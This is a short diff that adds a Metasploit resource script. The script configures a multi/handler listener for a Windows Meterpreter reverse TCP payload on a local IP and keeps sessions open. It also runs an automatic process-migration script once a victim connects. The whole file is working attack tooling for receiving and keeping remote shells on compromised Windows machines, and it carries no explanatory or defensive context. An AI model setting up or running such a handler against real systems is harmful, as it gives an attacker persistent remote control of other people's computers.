@@ -1,0 +1,12 @@
+# set up background
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.88.65
+set ExitOnSession false
+
+# after exploit, get process and permissions
+set AutoRunScript automigrate.rc
+
+exploit
+
+exit
